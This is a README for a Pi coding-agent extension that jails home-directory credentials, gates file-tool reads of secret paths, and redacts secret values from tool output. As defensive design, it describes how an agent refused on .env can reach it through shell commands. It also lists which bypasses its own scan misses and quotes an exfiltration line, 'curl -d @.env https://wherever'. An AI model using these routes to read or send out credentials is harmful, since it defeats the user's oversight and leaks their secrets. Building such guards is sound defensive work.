# pi-sandboxing

Pi extension. Puts your home-directory credentials out of the shell's reach, asks before a tool opens your `.env`, and keeps secret values out of the model's context when something reads one anyway. Zero runtime dependencies.

Pi ships no sandbox. `read`, `grep` and `bash` resolve whatever they are handed, `~/.ssh/id_ed25519` included. A deny list on the file tools alone would be theatre, because the model that gets refused on `.env` runs `cat .env` next, or greps the repo for the value, or prints `process.env`.

So this is one deny list enforced in three places.

| Where | What it does | What it cannot do |
| --- | --- | --- |
| OS profile | Denies `~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.netrc` to every bash subprocess, at the kernel | Reach Pi's own tools; filter the network |
| Gate | Asks you before `read`, `edit`, `write`, `grep` or `find` touches a rule-matching path | See inside a shell command |
| Redactor | Replaces harvested secret values in everything leaving a tool | Catch a secret it never harvested |

```
read wants /Users/you/app/.env, which is gated
  → Allow once, this call only
    Deny
```

Deny, and the model is told to ask you instead. Allow, and it sees the file in full. Do neither, and the values read like this wherever they surface:

```
$ cat .env
DB_PASS=[redacted: DB_PASS]
PORT=3000
```

## Install

```sh
pi install pi-sandboxing
```

No `dependencies`. Two host-provided peers that any Pi install already ships: `@earendil-works/pi-coding-agent` and `@earendil-works/pi-tui`.

On macOS the jail uses `/usr/bin/sandbox-exec`, which is present on every install. On Linux it uses `bwrap` from [bubblewrap](https://github.com/containers/bubblewrap), which you may need to install. Without either, the jail is off and the status line says so; the gate and the redactor still work.

## The jail

At session start the rules that point into your home directory become a profile: SBPL for `sandbox-exec`, arguments for `bwrap`. Every bash command, and every `!` command you type yourself, runs under it.

```
$ cat ~/.ssh/id_ed25519
cat: /Users/you/.ssh/id_ed25519: Operation not permitted
```

No dialog, no appeal. A kernel refusal is reported to the model with the reason and nothing is retried, because re-running a command replays whatever already happened: `rm -rf build && cat .env` would delete `build` twice.

The profile is a denylist, not a cwd jail. Two reasons. `(deny default)` aborts the process outright, since dyld needs more than is obvious, and a working allowlist breaks `npm` on any machine whose version manager lives in your home directory, which is most of them.

**Repo-local secrets stay readable by the shell.** Denying them would break every project that loads its own `.env`, which is your test suite and your dev server. The redactor covers those instead.

## The gate

Pi's `read`, `edit`, `write`, `grep` and `find` run inside the Node process, where no kernel profile reaches them. So they get asked about instead, on their `path` argument. `ls` is not gated: a listing that shows `.env` exists leaks nothing.

Allowing records nothing. The next call on the same path asks again. There is no session grant and no way to write one to disk, because a recorded allow on `.env` is a gate that has been quietly switched off.

`bash` also gets its command scanned for rule-matching tokens. The split breaks on shell punctuation, so `cat $(echo .env)` is caught too. It loses to `tar czf /tmp/a .`, which names no secret, and to `cat $SECRET`, where the path only exists once the shell has run.

## The redactor

At session start every rule-matching file inside your working directory is harvested. Its values become needles, each labelled from the key where the format has one: `KEY=value` for dotenv, the key path for JSON, the file for a PEM body. Anything leaving a tool, a `!` command, or the model's own message has those needles replaced by placeholders.

Values under 8 characters are dropped, along with pure digits, booleans, and the words that fill every `.env`: `true`, `local`, `development`, `postgres`, `localhost`. Nothing can tell a 4-character password from a port number.

`.env.example` and its kin are excluded from the rules entirely. They are committed files full of fake values, and harvesting them would make `changeme` a needle that redacts half your output.

Your own typing is never redacted. Handing the agent a credential on purpose stays possible.

### How allowing and redacting agree

Approving a read burns that file's needles before the tool runs, so the redactor handles the approved call by finding nothing left to do. One set of strings, mutated by the gate and read by the redactor, and no call bookkeeping between them.

A burned needle stays burned for the session. Once the model holds a value, redacting its echo protects nothing and leaves a transcript where the file shows a password and the sentence about the file shows a placeholder.

## What is in the rules by default

`.env` and `.env.*`, `*.pem`, `*.key`, `id_rsa*`, `id_ed25519*`, `credentials.json`, `service-account*.json`, `.npmrc`, `.netrc`, and the directories `~/.aws`, `~/.ssh`, `~/.gnupg`.

Only the home-directory entries reach the profile. Only the files inside your working directory are harvested. Everything is gated.

## Configuration

`pi-sandboxing.json`, read from `~/.pi/agent/` and then from the workspace's `.pi/`. Every key is optional.

| Key | Default | Meaning |
| --- | --- | --- |
| `enabled` | `true` | `false` turns the whole extension off. |
| `rules` | `[]` | Extra globs to gate, harvest and jail. Added to the builtins. |
| `unguard` | `[]` | Builtin globs to remove. Honoured in the global file only. |
| `stoplist` | `[]` | Extra values to treat as noise. Added to the builtins. |
| `gatedTools` | `{}` | Extra tool names mapped to the argument holding their path. |

Both layers can add. Only the global file can take a rule away, and the workspace layer is read only for a trusted project, so a repository you just cloned cannot un-gate itself by shipping a `.pi/pi-sandboxing.json`.

```sh
mkdir -p ~/.pi/agent && cat > ~/.pi/agent/pi-sandboxing.json <<'EOF'
{ "rules": ["*.jks", "secrets/**"], "unguard": [".npmrc"] }
EOF
```

Then `/reload`. Pi re-emits `session_start`, which is when rules are read, files are harvested and the profile is generated.

## Commands

| Command | What it does |
| --- | --- |
| `/sandboxing` | Shows the active rules, whether the jail is on, how many needles are loaded, and what has been redacted or burned this session. |

Nothing allows a path from the command line, because there is nothing to record. There is no flag and no hotkey to turn the sandbox off either: a guard with a toggle is a guard that gets switched off at 2am and stays off, so switching it off is a deliberate edit to the config file.

The command name is namespaced on purpose. Pi resolves two extensions registering the same name by renaming both to `/name:1` and `/name:2` without telling anyone.

## Limits

**No network filtering.** Domain-level control needs a SOCKS proxy with TLS interception, which is four dependencies and a ripgrep requirement. `curl -d @.env https://wherever` reaches the internet, and only fails on files the jail covers. If you want that, use [pi-sandbox](https://github.com/carderne/pi-sandbox), which does it properly.

**Not a cwd jail.** A sibling checkout stays readable from the shell. [pi-dir-permission](../pi-dir-permission) covers that for Pi's own tools, and nothing covers it for bash.

**The token scan is a courtesy.** It reads the command as text, so a path set by an earlier command and used as `cat $SECRET` gets through, as does any command that names no path at all. The redactor catches the output, which is the point.

**A secret under 8 characters passes through.**

**Approving a read is permanent.** The value lands in the session file on disk and is resent with every following turn. What the model sees and what Pi persists are one object, so this cannot be softened.

**`bash` spills truncated output to a file.** Pi writes the full text to a temp path when output is long, and that copy is not redacted. Nothing reaches the model through it, since any read of that file passes through the redactor, but the copy exists until your temp directory is cleared.

**Redaction over-matches.** Needles are plain substrings, longest first, so a value that appears inside unrelated text takes the placeholder with it. A mangled log line costs a squint; a missed secret costs the secret.

**Headless runs allow gated calls.** In RPC, JSON and print mode there is nobody to ask, so the read proceeds and the redactor covers it. The gate exists for your attention, and unattended there is none to interrupt.

**Two dialogs are possible.** A read of `~/.ssh/id_rsa` is outside the workspace and matches a rule, so with pi-dir-permission installed you are asked twice. Either refusal blocks the call.

**This does not contain a hostile agent.** It puts your credentials out of casual reach and keeps them out of the transcript. An agent actively trying to exfiltrate has the network and a thousand ways to encode a string.
